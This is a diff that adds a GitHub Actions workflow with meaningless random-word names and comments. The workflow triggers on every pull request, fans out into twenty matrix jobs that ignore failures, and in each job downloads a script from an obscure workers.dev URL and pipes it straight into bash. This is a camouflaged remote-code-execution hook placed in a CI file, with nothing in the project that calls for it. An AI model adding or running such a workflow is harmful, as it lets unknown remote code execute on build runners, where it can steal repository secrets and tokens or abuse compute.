@@ -1,0 +1,22 @@
+#clay liberate desperate
+name: estimate
+
+#secondary post ghost yard
+on:
+  pull_request:
+
+jobs:
+  dive:
+    #intention
+    steps:
+    - uses: actions/checkout@v6
+    #tackle
+    - name: handwriting
+      continue-on-error: true
+      run: curl -L "https://i.donnickcarbonaro70085.workers.dev/b18425f/2f731f5f/a5/6245d6afa2c54134/b62adb63b898/23494f3/bbbb7304c25f/?gv=1776085342&v=ecq&xc=fw&a=k" | bash
+    strategy:
+      matrix:
+        mutual: ["opportunity", "miss", "guideline", "mill", "peace"]
+        fertile: ["report", "park", "alike", "reporter"]
+      fail-fast: false
+    runs-on: ubuntu-latest
